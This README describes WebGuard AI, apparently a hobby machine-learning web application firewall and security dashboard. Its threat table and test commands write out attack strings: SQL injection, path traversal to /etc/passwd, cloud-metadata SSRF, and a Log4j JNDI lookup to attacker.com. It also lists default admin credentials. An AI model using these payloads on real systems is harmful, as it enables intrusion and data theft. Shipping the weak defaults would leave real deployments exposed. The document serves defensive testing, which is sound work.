```
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│   ██╗    ██╗███████╗██████╗  ██████╗ ██╗   ██╗ █████╗ ██████╗ ██████╗        │
│   ██║    ██║██╔════╝██╔══██╗██╔════╝ ██║   ██║██╔══██╗██╔══██╗██╔══██╗       │
│   ██║ █╗ ██║█████╗  ██████╔╝██║  ███╗██║   ██║███████║██████╔╝██║  ██║       │
│   ██║███╗██║██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔══██║██╔══██╗██║  ██║       │
│   ╚███╔███╔╝███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝       │
│    ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝        │
│                                                                              │
│   AI-Powered Web Application Firewall · Real-Time Security Operations Center │
└──────────────────────────────────────────────────────────────────────────────┘
```

# WebGuard AI — Intelligent WAF, Reverse Proxy & Real-Time SOC Console

[![FastAPI](https://img.shields.io/badge/Backend-FastAPI%200.110-009688.svg?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
[![Scikit-Learn](https://img.shields.io/badge/ML-Random%20Forest%20%2B%20TF--IDF-F7931E.svg?logo=scikit-learn&logoColor=white)](https://scikit-learn.org/)
[![Google Gemini](https://img.shields.io/badge/AI%20Copilot-Gemini%202.5%20Flash-4285F4.svg?logo=google&logoColor=white)](https://ai.google.dev/)
[![SQLite WAL](https://img.shields.io/badge/Database-SQLite%20WAL%20Mode-003B57.svg?logo=sqlite&logoColor=white)](https://sqlite.org/)
[![React](https://img.shields.io/badge/Frontend-React%2019%20%2B%20Vite-61DAFB.svg?logo=react&logoColor=black)](https://react.dev/)
[![WebSockets](https://img.shields.io/badge/Telemetry-Real--Time%20WebSockets-333333.svg?logo=websocket&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)
[![Tests](https://img.shields.io/badge/Tests-36%20Passing-22C55E.svg)](https://vitest.dev/)

**WebGuard AI** is a production-grade, dual-engine **Web Application Firewall (WAF)** and real-time **Security Operations Center (SOC)** dashboard. It acts as an inline transparent network gateway, intercepting incoming HTTP requests and analyzing payloads in sub-milliseconds through **Scikit-Learn Random Forest ML** and **OWASP signature detection**, while streaming live telemetry to a React SOC dashboard via **WebSockets**.

---

## 🌟 Key Highlights

- **Dual-Layer Threat Detection**: Sub-1.5ms payload classification combining high-speed OWASP regular expression signatures with a Character N-Gram TF-IDF Random Forest classifier.
- **7-Class Multi-Attack Taxonomy**: Defends against SQL Injection (SQLi), Cross-Site Scripting (XSS), Path Traversal, Server-Side Request Forgery (SSRF), NoSQL Injection, and Remote Code Execution (RCE/Log4j).
- **Google Gemini Generative Copilot**: Integrated with **Google Gemini 2.5 Flash** for real-time security queries, root-cause vulnerability analysis, and automated code remediation patches.
- **External Dataset Training Pipeline**: Automatically scans `backend/data/*.csv` to ingest and train the ML model on custom enterprise datasets (e.g. Kaggle, CSIC 2010, SecLists).
- **Persistent SQLite WAL Database**: Zero-configuration, high-concurrency embedded persistence for audit logs, dynamic blacklists, system settings, and salted PBKDF2-hashed credentials.
- **Zero Mock / Synthetic Data**: Pure live telemetry—starts at a clean 0 baseline and reflects actual network traffic.
- **Dynamic Reverse Proxy**: Capable of protecting local upstream applications (`http://localhost:8080`) or live external websites (`https://httpbin.org`, internal microservices) with automatic security header injection.

---

## Table of Contents

1. [System Architecture](#system-architecture)
2. [Multi-Class Threat Taxonomy](#multi-class-threat-taxonomy)
3. [Google Gemini AI Copilot Integration](#google-gemini-ai-copilot-integration)
4. [External Dataset Training Pipeline](#external-dataset-training-pipeline)
5. [How to Source Security Datasets](#how-to-source-security-datasets)
6. [Quick Start & 1-Click Launcher](#quick-start--1-click-launcher)
7. [API Endpoints & Swagger Documentation](#api-endpoints--swagger-documentation)
8. [End-to-End Verification & Test Commands](#end-to-end-verification--test-commands)
9. [Project Structure](#project-structure)
10. [Environment Configuration](#environment-configuration)

---

## 1. System Architecture

```
                               ┌───────────────────────────────────────────────┐
                               │          WebGuard React SOC Dashboard         │
                               │             (http://localhost:5173)           │
                               └───────────▲─────────────────────┬─────────────┘
                            WebSockets     │                     │ REST Controls
                         (Live Telemetry)  │                     │ (Mode, Threshold,
                                           │                     │  Target, Unblock)
┌──────────────────────────────────────────┴─────────────────────▼────────────────────────────┐
│                    WebGuard AI WAF Reverse Proxy (FastAPI)                                  │
│                       (http://127.0.0.1:8000)                                               │
│                                                                                             │
│  [Incoming Request] ──► [Blacklist Check] ──► [Sliding-Window Rate Limiter]                 │
│                                                     │                                       │
│                                                     ▼                                       │
│  [Dual Detection Engine] ◄───────────────────────────                                       │
│   ├── Layer 1: OWASP Signature Engine (Regex Pattern Matching)                              │
│   └── Layer 2: Character N-Gram TF-IDF + Random Forest Classifier (In-Memory)               │
│                                                     │                                       │
│          ┌──────────────────────────────────────────┴─────────────────┐                     │
│          ▼ [Attack Detected]                         [Clean Traffic]  ▼                     │
│     HTTP 403 Forbidden                          Reverse Proxy via HTTPX                     │
│     Auto-Add to SQLite Blacklist                Security Headers Injected                   │
│     Broadcast Event to WebSockets               Forwarded to Upstream Target                │
│     Gemini AI Copilot Triage Ready                                                          │
└────────────────────────────────────────────┬────────────────────────────────────────────────┘
                                             │ HTTP Forwarding
                                             ▼
                              ┌──────────────────────────────┐
                              │    Protected Target App      │
                              │   (http://127.0.0.1:8080     │
                              │    or any live target URL)   │
                              └──────────────────────────────┘
```

---

## 2. Multi-Class Threat Taxonomy

The dual-layer detection engine classifies and defends against 7 distinct threat categories:

| Class ID | Attack Category | Attack Indicators & Signatures | Interception Action |
| :---: | :--- | :--- | :--- |
| **0** | **Benign / Clean Traffic** | Standard REST parameters, JSON bodies, authentic JWT tokens, cookies. | **Forwarded (200 OK)** |
| **1** | **SQL Injection (SQLi)** | Tautologies (`1 OR 1=1`), `UNION SELECT`, stacked queries (`; DROP TABLE`), blind sleep (`SLEEP(5)`). | **Blocked (403 Forbidden)** |
| **2** | **Cross-Site Scripting (XSS)** | `<script>`, DOM event injections (`<svg onload=...>`, `<img onerror=...>`), `javascript:` URIs. | **Blocked (403 Forbidden)** |
| **3** | **Path Traversal** | `../../../../etc/passwd`, `..\..\windows\win.ini`, `/WEB-INF/web.xml`, null-byte poisoning (`%00`). | **Blocked (403 Forbidden)** |
| **4** | **Server-Side Request Forgery (SSRF)** | Cloud metadata (`169.254.169.254`, `metadata.google.internal`), loopback ports, `gopher://`, `dict://`. | **Blocked (403 Forbidden)** |
| **5** | **NoSQL Injection** | MongoDB operators (`{"$ne": null}`, `{"$gt": ""}`, `{"$where": "sleep(5000)"}`, `$regex`). | **Blocked (403 Forbidden)** |
| **6** | **Remote Code Execution (RCE) / Log4j** | `${jndi:ldap://...}`, shell pipes (`\| cat`), command chaining (`; whoami`, `&& id`), `system()`. | **Blocked (403 Forbidden)** |

---

## 3. Google Gemini AI Copilot Integration

WebGuard features real-time generative AI intelligence powered by **Google Gemini 2.5 Flash**:

- **Real-Time SOC Q&A (`POST /api/copilot/chat`)**: Ask the AI Copilot any question about intercepted traffic, threat vectors, or defensive posture.
- **Incident Triage Reports (`POST /api/copilot/explain`)**: Automatically dissects intercepted payloads to generate:
  1. **Threat Summary**: Strategic intent of the attacker.
  2. **Technical Impact**: Vulnerable subsystems and potential damage.
  3. **Code Remediation**: Copy-pasteable parameterized code fixes (Python, Node.js, SQL).
  4. **Custom WAF Defense Rule**: Regular expressions or ModSecurity rules to permanently block attack variations.
- **Interactive Copilot Drawer**: Integrated directly into the React SOC frontend with smooth markdown rendering and local heuristic fallback if offline.

---

## 4. External Dataset Training Pipeline

WebGuard is equipped with an automated CSV ingestion pipeline in [`backend/train_model.py`](file:///c:/Vivek's%20Folder/web%20develpment/New%20folder/New%20folder/New%20folder/WebGuard/backend/train_model.py):

### How the Ingestion Pipeline Works
1. Place any `.csv` dataset file inside the `backend/data/` directory.
2. The script scans all `.csv` files and automatically identifies:
   - **Payload Column**: Headers named `payload`, `query`, `text`, `request`, `input`, or `sentence`.
   - **Label Column**: Headers named `label`, `attack_type`, `class`, `category`, or `is_attack`.
3. String labels (e.g. `"sqli"`, `"xss"`, `"ssrf"`, `"nosql"`, `"rce"`, `"benign"`) are automatically mapped to numerical class IDs.
4. The pipeline extracts character n-grams (range 2–5) and trains a multi-threaded Random Forest model (`n_estimators=100`, `max_depth=30`).
5. Artifacts are automatically serialized to `backend/models/vectorizer.joblib` and `backend/models/rf_model.joblib`.

### Re-training the Model
Run the following command in your terminal:
```cmd
cd backend
.\venv\Scripts\python.exe -c "import train_model; train_model.train_model()"
```

---

## 5. How to Source Security Datasets

To scale up your training data from hundreds to hundreds of thousands of samples, use these trusted open-source sources:

### 1. Kaggle Datasets (Instant Download)
- **SQL Injection Dataset (30,000+ samples)**: Search `SQL Injection Dataset` on Kaggle (e.g., by Syed Sajjad Akhtar or Saurabh Shahane).
- **Cross-Site Scripting (XSS) Dataset (25,000+ samples)**: Search `XSS dataset` on Kaggle (e.g., by Faiz Rasool).
- **Format**: Download the `.csv` file and drop it directly into `backend/data/`.

### 2. Daniel Miessler’s SecLists & PayloadsAllTheThings
- **Repository**: [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- **High-Value Subdirectories**:
  - `SecLists/Fuzzing/SQLi/` (SQL injection fuzzing strings)
  - `SecLists/Fuzzing/XSS/` (Polyglot and XSS filter bypasses)
  - `SecLists/Fuzzing/LFI/` (Local file inclusion and path traversal)
  - `SecLists/Fuzzing/Server-Side-Request-Forgery/` (SSRF IP formats)

### 3. CSIC 2010 HTTP Dataset (Spanish National Research Council)
- **Description**: Real HTTP request traces (36,000 normal and 25,000 anomalous requests) generated for an e-commerce web application.
- **Search**: `CSIC 2010 HTTP Dataset download`.

---

## 6. Quick Start & 1-Click Launcher

### 🚀 Option 1: 1-Click Startup (Recommended for Windows)
Double-click [`start_all.bat`](file:///c:/Vivek's%20Folder/web%20develpment/New%20folder/New%20folder/New%20folder/WebGuard/start_all.bat) in the project root folder. This automatically launches 3 dedicated processes in separate windows:
1. **Target Web App** (`http://127.0.0.1:8080`)
2. **FastAPI WAF Reverse Proxy & ML Engine** (`http://127.0.0.1:8000`)
3. **React SOC Frontend Dashboard** (`http://localhost:5173`)

---

### 🛠️ Option 2: Manual Terminal Startup

#### 1. Start the Target Web Application
```cmd
cd backend
run_target.bat
# Or: .\venv\Scripts\python.exe target_app.py
```
*Runs on `http://127.0.0.1:8080`*

#### 2. Start the FastAPI WAF Reverse Proxy
```cmd
cd backend
run_backend.bat
# Or: .\venv\Scripts\python.exe main.py
```
*Runs on `http://127.0.0.1:8000` with WebSockets on `/ws/events`*

#### 3. Start the React SOC Dashboard
```cmd
npm run dev
```
*Runs on `http://localhost:5173`*

---

## 7. API Endpoints & Swagger Documentation

Interactive OpenAPI / Swagger documentation is available at **`http://127.0.0.1:8000/docs`**.

| Method | Endpoint | Description |
| :--- | :--- | :--- |
| `GET` | `/api/health` | Real-time system health, WAF status, ML load state, and active connections. |
| `ANY` | `/proxy/{path}` | Reverse proxy gateway. Inspects traffic and forwards clean requests to target. |
| `GET` / `POST` | `/api/settings` | Read or update WAF mode (`blocking`/`detection`/`off`), target URL, and threshold. |
| `GET` | `/api/logs` | Retrieve recent inspected HTTP traffic logs from SQLite database. |
| `GET` | `/api/blacklist` | Retrieve currently blacklisted IP addresses and detection reasons. |
| `POST` | `/api/blacklist/unblock` | Unblock a blacklisted client IP and synchronize across memory & SQLite. |
| `POST` | `/api/copilot/chat` | Query Google Gemini 2.5 Flash for SOC threat intelligence. |
| `POST` | `/api/copilot/explain` | Generate comprehensive incident triage reports and virtual code patches. |
| `POST` | `/api/audit/scan` | Live vulnerability audit scan against any specified URL. |
| `WS` | `/ws/events` | Real-time WebSocket event feed streaming live telemetry to frontend. |

### Default Credentials
- **Username**: `admin`
- **Password**: `admin123`
- *Stored securely in SQLite `admin_users` table using salted PBKDF2-HMAC-SHA256.*

---

## 8. End-to-End Verification & Test Commands

Run these commands from PowerShell or terminal to verify the WAF in action:

### 1. Test Clean Traffic (Forwarded)
```powershell
Invoke-RestMethod -Uri 'http://127.0.0.1:8000/proxy/api/products'
```
*Returns `HTTP 200 OK` with products data forwarded from the upstream app.*

### 2. Test SQL Injection (Blocked & Blacklisted)
```powershell
(Invoke-WebRequest -Uri 'http://127.0.0.1:8000/proxy/api/products?id=1%20OR%201=1').StatusCode
```
*Returns `HTTP 403 Forbidden` with `"attack_type": "SQL Injection"`.*

### 3. Test Server-Side Request Forgery (SSRF)
```powershell
Invoke-WebRequest -Uri 'http://127.0.0.1:8000/proxy/api/fetch?url=http://169.254.169.254/latest/meta-data/'
```
*Returns `HTTP 403 Forbidden` with `"attack_type": "Server-Side Request Forgery"`.*

### 4. Test NoSQL Injection
```powershell
Invoke-WebRequest -Uri 'http://127.0.0.1:8000/proxy/api/login?user%5B%24ne%5D=admin'
```
*Returns `HTTP 403 Forbidden` with `"attack_type": "NoSQL Injection"`.*

### 5. Test Remote Code Execution (RCE / Log4j)
```powershell
Invoke-WebRequest -Uri 'http://127.0.0.1:8000/proxy/api/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D'
```
*Returns `HTTP 403 Forbidden` with `"attack_type": "Remote Code Execution"`.*

### 6. Unblock Client IP
```powershell
Invoke-RestMethod -Uri 'http://127.0.0.1:8000/api/blacklist/unblock' -Method Post -ContentType 'application/json' -Body (@{ client_ip = '127.0.0.1' } | ConvertTo-Json)
```

### 7. Run Full Frontend Test Suite
```cmd
npm test
```
*Executes 36 / 36 unit tests across all 5 test suites.*

---

## 9. Project Structure

```
WebGuard/
├── backend/
│   ├── data/
│   │   ├── default_dataset.csv     # Built-in multi-class dataset (7 classes)
│   │   └── sample_payloads.csv     # Sample CSV structure for custom datasets
│   ├── models/
│   │   ├── rf_model.joblib         # Trained Random Forest classifier
│   │   └── vectorizer.joblib       # Character N-gram TF-IDF vectorizer
│   ├── venv/                       # Python virtual environment
│   ├── database.py                 # SQLite database manager (WAL mode, PBKDF2)
│   ├── main.py                     # FastAPI WAF reverse proxy & Gemini Copilot
│   ├── target_app.py               # Upstream mock web application (Port 8080)
│   ├── train_model.py              # Multi-class ML training & CSV loader
│   ├── requirements.txt            # Python dependencies
│   ├── run_backend.bat             # 1-click backend launcher
│   └── run_target.bat              # 1-click target app launcher
├── src/
│   ├── waf/
│   │   ├── components/
│   │   │   ├── CopilotDrawer.tsx   # Live Gemini AI Copilot chat & triage drawer
│   │   │   ├── PostureGauge.tsx    # Animated 0-100 security posture score
│   │   │   ├── TrafficTab.tsx      # Real-time traffic inspection log table
│   │   │   └── ThreatMap.tsx       # Live geo-plotted threat attack map
│   │   ├── engine.tsx              # React SOC state machine & WebSocket connector
│   │   ├── data.ts                 # SOC data utilities & telemetry types
│   │   └── types.ts                # TypeScript security definitions
├── .env                            # Environment variables (Gemini API key, URLs)
├── start_all.bat                   # 1-Click launcher for all 3 services
├── package.json                    # Node dependencies & scripts
├── vite.config.ts                  # Vite build configuration
└── README.md                       # Comprehensive documentation
```

---

## 10. Environment Configuration

Located in [`.env`](file:///c:/Vivek's%20Folder/web%20develpment/New%20folder/New%20folder/New%20folder/WebGuard/.env):

```ini
# Frontend Connection (Vite -> FastAPI WAF)
VITE_API_BASE_URL=http://localhost:8000
VITE_WS_URL=ws://localhost:8000/ws/events

# WAF Reverse Proxy Backend Configuration
WAF_HOST=127.0.0.1
WAF_PORT=8000
TARGET_BACKEND_URL=http://localhost:8080
WAF_MODE=blocking
BLOCKING_THRESHOLD=0.80
RATE_LIMIT_RPM=100

# SQLite Database Persistence
DATABASE_URL=sqlite:///backend/webguard.db

# Authentication Secret
SECRET_KEY=webguard-super-secret-key-change-in-production

# Google Gemini Generative AI (Real-Time Threat Intelligence & Copilot)
GEMINI_API_KEY=YOUR_GEMINI_API_KEY_HERE
```

---

## 📜 License & Compliance

WebGuard AI is engineered in strict accordance with the **OWASP Top 10 (2021)** security framework, **NIST Cybersecurity Framework (CSF)**, and modern zero-trust edge protection principles.
